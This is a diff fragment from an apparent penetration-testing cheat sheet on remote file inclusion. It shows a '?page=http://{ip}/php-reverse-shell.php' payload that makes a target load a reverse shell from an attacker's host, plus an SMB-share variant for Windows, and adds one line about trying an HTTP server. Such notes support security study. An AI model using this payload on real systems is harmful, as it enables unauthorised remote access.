@@ -65,6 +65,7 @@
 - RFI request to the website
   ``` ?page=http://{ip}/php-reverse-shell.php ```
 ### Windows
+- try 80 http server OR
 - smbserver 445
 - ``` \\kali\test.php ```
 
